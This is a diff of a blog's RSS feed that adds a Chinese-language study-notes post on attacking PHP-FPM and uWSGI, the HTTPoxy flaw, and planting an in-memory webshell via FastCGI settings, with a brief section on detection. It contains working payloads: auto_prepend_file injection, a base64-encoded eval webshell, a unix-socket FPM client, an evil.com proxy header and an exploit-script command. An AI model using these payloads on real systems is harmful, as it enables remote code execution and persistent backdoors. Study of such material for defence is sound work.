@@ -1,4 +1,130 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>PHP on AmiaaaZ's Site</title><link>https://amiaaaz.github.io/tags/php/</link><description>Recent content in PHP on AmiaaaZ's Site</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Sun, 24 Apr 2022 21:42:33 +0800</lastBuildDate><atom:link href="https://amiaaaz.github.io/tags/php/index.xml" rel="self" type="application/rss+xml"/><item><title>php反序列化中的报错&amp;GC与二次序列化问题</title><link>https://amiaaaz.github.io/2022/04/24/php-unserialize-notes/</link><pubDate>Sun, 24 Apr 2022 21:42:33 +0800</pubDate><guid>https://amiaaaz.github.io/2022/04/24/php-unserialize-notes/</guid><description>&lt;h2 id="报错gc相关问题">报错&amp;amp;GC相关问题&lt;/h2>
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>PHP on AmiaaaZ's Site</title><link>https://amiaaaz.github.io/tags/php/</link><description>Recent content in PHP on AmiaaaZ's Site</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Tue, 13 Sep 2022 14:46:49 +0800</lastBuildDate><atom:link href="https://amiaaaz.github.io/tags/php/index.xml" rel="self" type="application/rss+xml"/><item><title>PHP-FPM内存马&amp;攻击CGI学习笔记</title><link>https://amiaaaz.github.io/2022/09/13/php-fpm-mem-shell-study-notes/</link><pubDate>Tue, 13 Sep 2022 14:46:49 +0800</pubDate><guid>https://amiaaaz.github.io/2022/09/13/php-fpm-mem-shell-study-notes/</guid><description>&lt;p>看到带佬用php-fpm做内存马，于是把php-fpm和cgi相关的知识再拿出来学学学&lt;/p>
+&lt;h2 id="攻击php-fpm">攻击php-fpm&lt;/h2>
+&lt;p>FastCGI是常见的webserver动态脚本执行模型之一，主要目的是将webserver和动态语言的执行分成两个不同的常驻进程，当webserver接收到动态脚本的请求，就通过fastcgi协议将请求通过网络转发给fastcgi进程（即fpm），处理之后再将结果传给webserver，然后webserver再输出给浏览器；这种模型下不需要嵌入脚本解释器到webserver中，增加伸缩性和可维护性&lt;/p>
+&lt;p>fpm的默认监听端口是9000，如果目标对外开放了9000端口，我们可以利用这个开放的fpm对其发送符合fastcgi协议的请求，当header中的type指定为4时 可以给php-fpn传递环境参数，包含以下的内容&lt;/p>
+&lt;pre tabindex="0">&lt;code>{
+&amp;#39;GATEWAY_INTERFACE&amp;#39;: &amp;#39;FastCGI/1.0&amp;#39;,
+&amp;#39;REQUEST_METHOD&amp;#39;: &amp;#39;GET&amp;#39;,
+&amp;#39;SCRIPT_FILENAME&amp;#39;: &amp;#39;/var/www/html/index.php&amp;#39;,
+&amp;#39;SCRIPT_NAME&amp;#39;: &amp;#39;/index.php&amp;#39;,
+&amp;#39;QUERY_STRING&amp;#39;: &amp;#39;?a=1&amp;amp;b=2&amp;#39;,
+&amp;#39;REQUEST_URI&amp;#39;: &amp;#39;/index.php?a=1&amp;amp;b=2&amp;#39;,
+&amp;#39;DOCUMENT_ROOT&amp;#39;: &amp;#39;/var/www/html&amp;#39;,
+&amp;#39;SERVER_SOFTWARE&amp;#39;: &amp;#39;php/fcgiclient&amp;#39;,
+&amp;#39;REMOTE_ADDR&amp;#39;: &amp;#39;127.0.0.1&amp;#39;,
+&amp;#39;REMOTE_PORT&amp;#39;: &amp;#39;12345&amp;#39;,
+&amp;#39;SERVER_ADDR&amp;#39;: &amp;#39;127.0.0.1&amp;#39;,
+&amp;#39;SERVER_PORT&amp;#39;: &amp;#39;80&amp;#39;,
+&amp;#39;SERVER_NAME&amp;#39;: &amp;#34;localhost&amp;#34;,
+&amp;#39;SERVER_PROTOCOL&amp;#39;: &amp;#39;HTTP/1.1&amp;#39;
+}
+&lt;/code>&lt;/pre>&lt;p>其中&lt;code>SCRIPT_FILENAME&lt;/code>就是php-fpm会去执行的文件，由于5.3.9版本引入了&lt;code>security.limit_extensions&lt;/code>的选项，默认对后缀名限制在了php家族，所以我们可以考虑找到已存在php文件（安装时附带的php文件 可以通过&lt;code>find / -name &amp;quot;*.php&amp;quot;&lt;/code>来搜索一下默认环境 比如/usr/local/lib/php/PEAR.php），向其中注入恶意代码；而fpm支持通过设置&lt;code>FASTCGI_PARAMS&lt;/code>来动态修改 php 的设置，可以利用这两项&lt;/p>
+&lt;pre tabindex="0">&lt;code>&amp;#39;PHP_VALUE&amp;#39;: &amp;#39;auto_prepend_file = php://input&amp;#39;,
+&amp;#39;PHP_ADMIN_VALUE&amp;#39;: &amp;#39;allow_url_include = On&amp;#39;
+# &amp;#34;allow_url_include = On\ndisable_functions = \nsafe_mode = Off&amp;#34;
+# &amp;#34;allow_url_include = On\nextension = /path/to/abc.so&amp;#34;
+&lt;/code>&lt;/pre>&lt;p>来做到执行某php文件时自动包含 POST 内容，执行恶意代码（disable_function在php加载时就确定好了，无法重写，但是可以修改open_basedir的值）&lt;/p>
+&lt;p>所以综上，我们的攻击思路就是伪造一个可以正常通信的FastCGI客户端，将传输的内容修改为我们的恶意payload（利用&lt;code>PHP_VALUE&lt;/code>和&lt;code>PHP_ADMIN_VALUE&lt;/code>这两个可动态修改php设置的项），再发出去；根据目标又可以分成以下几种&lt;/p>
+&lt;ul>
+&lt;li>&lt;strong>远程攻击php-fpm&lt;/strong>&lt;/li>
+&lt;/ul>
+&lt;p>p牛的php-fpm脚本直接嗦，可以执行任意php代码或加载恶意.so&lt;/p>
+&lt;ul>
+&lt;li>&lt;strong>SSRF攻击本地php-fpm&lt;/strong>&lt;/li>
+&lt;/ul>
+&lt;p>用gopher打内网fpm9000，payload还是p牛的脚本&lt;/p>
+&lt;ul>
+&lt;li>&lt;strong>结合ftp&amp;amp;PASV mode攻击本地php-fpm（已知开放内网fpm端口）&lt;/strong>&lt;/li>
+&lt;/ul>
+&lt;p>在受害者端模拟一个ftp-server（用来将我们希望执行的内容转发至fpm），在响应PASV命令（即切换被动模式时）返回&lt;code>(127,0,0,1,0,12345)&lt;/code>来让ftp-data打向我们指定的内网12345端口；如果是EPSV mode，就不会在通信中有(ip, port)的值 只能把data打向控制连接的服务端的端口，解决方法：手动把EPSV命令的返回结果设为非229的值，那么php的ftp://就会使用PASV命令&lt;/p>
+&lt;p>之后用继续上面php-fpm的脚本，先覆盖掉原有open_basedir的设置再写入恶意.so，进行RCE&lt;/p>
+&lt;ul>
+&lt;li>&lt;strong>攻击unix-socket模式下的php-fpm&lt;/strong>&lt;/li>
+&lt;/ul>
+&lt;p>由于unix-socket是读取/run/php/php7.4-fpm.sock进行内部通信，所以不能打远程的，我们用&lt;code>stream_socket_client&lt;/code>建立一个unix-socket连接，然后写入tcp流来通信&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span> &lt;span style="color:#111">$sock&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#75af00">stream_socket_client&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;unix:///run/php/php7.3-fpm.sock&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>&lt;span style="color:#75af00">fputs&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$sock&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#75af00">base64_decode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_POST&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;A&amp;#39;&lt;/span>&lt;span style="color:#111">]));&lt;/span>&lt;span style="color:#75af00">var_dump&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">fread&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$sock&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">4096&lt;/span>&lt;span style="color:#111">));&lt;/span>&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="cgi-httpoxy">CGI HTTPoxy&lt;/h2>
+&lt;blockquote>
+&lt;p>php&amp;lt;5.6.24&lt;/p>
+&lt;p>不止影响php，所有以CGI或Fastcgi运行的程序理论上都受到影响&lt;/p>
+&lt;p>&lt;a href="https://httpoxy.org/">httpoxy&lt;/a>&lt;/p>
+&lt;/blockquote>
+&lt;p>根据RFC 3875的规定，CGI/FastCGI要将用户传入的所有http头都加上&lt;code>HTTP_&lt;/code>前缀放入环境变量中，而恰好大多数类库会约定俗成地提取环境变量&lt;code>HTTP_PROXY&lt;/code>作为程序HTTP代理地址，于是可以构造&lt;code>Proxy: http://evil.com/&lt;/code>这样的请求头将使用缺陷类库的网站的代理设置为&lt;code>http://evil.com/&lt;/code>&lt;/p>
+&lt;h2 id="uwsgi-rce">uWSGI RCE&lt;/h2>
+&lt;p>类似fastcgi，经常作为python应用容器启动，也支持加载perl/ruby/go等应用&lt;/p>
+&lt;p>漏洞的成因和上面那个很相似，在uwsgi的协议中允许通过变量来动态调整参数，其中&lt;code>UWSG_FILE&lt;/code>参数可以用来忽略原有uWSGI绑定的app，设定一个新的文件进行加载执行（类似上面的&lt;code>SCRIPT_FILENAME&lt;/code>）&lt;/p>
+&lt;p>同时uWSGI程序中默认注册了一系列schemes，导致可以进一步利用&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">uwsgi_setup_schemes&lt;/span>&lt;span style="color:#111">()&lt;/span> &lt;span style="color:#111">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">uwsgi_register_scheme&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;emperor&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">uwsgi_scheme_emperor&lt;/span>&lt;span style="color:#111">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">uwsgi_register_scheme&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;http&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">uwsgi_scheme_http&lt;/span>&lt;span style="color:#111">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">uwsgi_register_scheme&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;data&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">uwsgi_scheme_data&lt;/span>&lt;span style="color:#111">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">uwsgi_register_scheme&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;sym&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">uwsgi_scheme_sym&lt;/span>&lt;span style="color:#111">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">uwsgi_register_scheme&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;section&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">uwsgi_scheme_section&lt;/span>&lt;span style="color:#111">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">uwsgi_register_scheme&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;fd&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">uwsgi_scheme_fd&lt;/span>&lt;span style="color:#111">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">uwsgi_register_scheme&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;exec&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">uwsgi_scheme_exec&lt;/span>&lt;span style="color:#111">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">uwsgi_register_scheme&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;call&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">uwsgi_scheme_call&lt;/span>&lt;span style="color:#111">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">uwsgi_register_scheme&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;callint&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">uwsgi_scheme_callint&lt;/span>&lt;span style="color:#111">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#75af00">uwsgi_scheme_exec&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#111">url&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">size_t&lt;/span> &lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#111">size&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">add_zero&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">cpipe&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">];&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">pipe&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">cpipe&lt;/span>&lt;span style="color:#111">))&lt;/span> &lt;span style="color:#111">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">uwsgi_error&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;pipe()&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">exit&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">uwsgi_run_command&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">url&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">NULL&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">cpipe&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">]);&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#111">buffer&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">uwsgi_read_fd&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">cpipe&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">],&lt;/span> &lt;span style="color:#111">size&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">add_zero&lt;/span>&lt;span style="color:#111">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">close&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">cpipe&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">]);&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">close&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">cpipe&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">]);&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">buffer&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>其中存在exec协议，结合前面的&lt;code>UWSGI_FILE&lt;/code>变量，可以导致RCE&lt;/p>
+&lt;p>属于是和上面php-fpm无限类似，我们也可以找到一个可以访问到的uWSGI端口（uWSGI协议）并对其发送uWSGI协议的payload即可&lt;/p>
+&lt;p>例如目标主机上是这样的&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>uwsgi --socket :8001 --module project.wsgi
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>可以利用&lt;a href="https://github.com/wofeiwo/webcgi-exploits/blob/master/python/uwsgi_exp.py">uwsgi_exp.py&lt;/a>嗦&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>python uwsgi_exp.py -u x.x.x.x:8001 -c &lt;span style="color:#d88200">&amp;#34;echo &amp;#39;1111&amp;#39; &amp;gt; /tmp/test&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="php-fpm做内存马">php-fpm做内存马&lt;/h2>
+&lt;p>内存马与常规的webshell最显著的区别在于删除上马凭借的文件后依旧存在于当前进程中，除非重启程序；抽象出我们的需求：&lt;/p>
+&lt;ol>
+&lt;li>让后门代码在内存中驻留&lt;/li>
+&lt;li>可以通过正常的请求手段触发执行&lt;/li>
+&lt;/ol>
+&lt;p>对于第一点，本身我们的fastcgi(fpm)就是常驻内存的（也是优于传统cgi的地方），并且在一次fastcgi请求中经过&lt;code>PHP_VALUE&lt;/code>或&lt;code>PHP_ADMIN_VALUE&lt;/code>修改的php配置值在此fpm的生命周期内都会被保留下来&lt;/p>
+&lt;p>所以我们可以继续沿用上面攻击php-fpm的方法&lt;/p>
+&lt;pre tabindex="0">&lt;code>&amp;#39;PHP_VALUE&amp;#39;: &amp;#39;auto_prepend_file = php://input&amp;#39;
+&lt;/code>&lt;/pre>&lt;p>但是这样的&lt;code>php://input&lt;/code>需要解析每一次的代码，对于内存马来说相当失败，我们把它换成data协议固定下来&lt;/p>
+&lt;p>假设这里是&lt;strong>SSRF攻击本地php-fpm&lt;/strong>的场景，我们继续用上面的脚本，稍作修改&lt;/p>
+&lt;ul>
+&lt;li>
+&lt;p>post换为get（不需要解析php://input&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;code>auto_prepend_file = \&amp;quot;data:;base64,PD9waHAgQGV2YWwoJF9SRVFVRVNUW3Rlc3RdKTsgPz4=\&amp;quot;&lt;/code>&lt;/p>
+&lt;/li>
+&lt;/ul>
+&lt;p>其余的不变，依旧要指定一个服务端已存在的文件，之后通过这个&lt;code>auto_prepend_file&lt;/code>就可以植入内存马&lt;/p>
+&lt;p>不过这样的方案也有一定的局限性，它是和服务端的php-fpm worker进程绑定的，如果服务器上有多个worker进程，我们需要多发送几次之前的请求，才可以让payload感染每一个进程&lt;/p>
+&lt;p>另一个需要注意的点是php-fpm.conf的一个配置项&lt;code>pm.max_requests&lt;/code>，它定义了每一个 worker 进程最大处理多少请求，就会自动重启，避免内存泄漏，但是一旦重生我们的内存马也会失效，还好默认是0&lt;/p>
+&lt;p>我们可以根据wofeiwo师傅之前写的&lt;a href="https://gist.github.com/wofeiwo/4f41381a388accbf91f8#file-fcgi_jailbreak-php">fcgi_jailbreak.php&lt;/a>改造出fpm内存马一把梭的脚本，具体修改的地方就是上面的&lt;code>php://input&lt;/code>改为一句话马&lt;/p>
+&lt;p>&lt;img src="https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20220913144342599.png" alt="image-20220913144342599.png">&lt;/p>
+&lt;p>其余部分不变，继续用即可&lt;/p>
+&lt;h2 id="查杀">查杀&lt;/h2>
+&lt;p>不可避开的话题是内存马的查杀，由于它只是动态修改了内存中的 PHP 配置，我们也无法从&lt;code>PHP.ini/.user.ini/php-fpm.conf&lt;/code>等文件内容中检测，真正添加内存马由于只需要对fpm监听的端口发送请求，因此也无法从webserver的accesslog中发现问题&lt;/p>
+&lt;p>或许可以通过rasp之类的工具检查&lt;code>auto_prepend_file/auto_append_file/allow_url_inclue&lt;/code>配置的变化来做检测&lt;/p>
+&lt;p>个人认为可以通过流量的行为进行检查，当出现了rce相关的流量但没有文件马的时候就可以考虑是php-fpm的内存马了&lt;/p>
+&lt;hr>
+&lt;details>
+&lt;summary>
+&lt;h4 class="inline">
+以下是本文中涉及到的 和我学习时看过的所有文章的链接🔗 每日感谢互联网的丰富资源（
+&lt;/h4>
+&lt;/summary>
+&lt;p>&lt;a href="https://github.com/wofeiwo/webcgi-exploits/blob/master/php/Fastcgi/php-fastcgi-remote-exploit.md">PHP FastCGI 的远程利用&lt;/a> | &lt;a href="https://amiaaaz.github.io/2021/11/18/attack-php-fpm-study-notes/">攻击 PHP-FPM 学习笔记&lt;/a>&lt;/p>
+&lt;p>&lt;a href="https://github.com/vulhub/vulhub/tree/master/cgi/CVE-2016-5385">CVE-2016-5385&lt;/a> | &lt;a href="https://httpoxy.org/">httpoxy&lt;/a> | &lt;a href="https://www.laruence.com/2016/07/19/3101.html">HTTPOXY漏洞说明&lt;/a>&lt;/p>
+&lt;p>&lt;a href="https://github.com/wofeiwo/webcgi-exploits/blob/master/python/uwsgi-rce-zh.md">uWSGI 远程代码执行漏洞&lt;/a>&lt;/p>
+&lt;p>&lt;a href="https://tttang.com/archive/1720/">利用 PHP-FPM 做内存马的方法&lt;/a>&lt;/p>
+&lt;/details></description></item><item><title>php反序列化中的报错&amp;GC与二次序列化问题</title><link>https://amiaaaz.github.io/2022/04/24/php-unserialize-notes/</link><pubDate>Sun, 24 Apr 2022 21:42:33 +0800</pubDate><guid>https://amiaaaz.github.io/2022/04/24/php-unserialize-notes/</guid><description>&lt;h2 id="报错gc相关问题">报错&amp;amp;GC相关问题&lt;/h2>
 &lt;p>PHP是存在GC的语言，而反序列化对象时的&lt;code>__destruct&lt;/code>就是对已new对象的回收，一个小栗子&lt;/p>
 &lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">error_reporting&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">);&lt;/span>
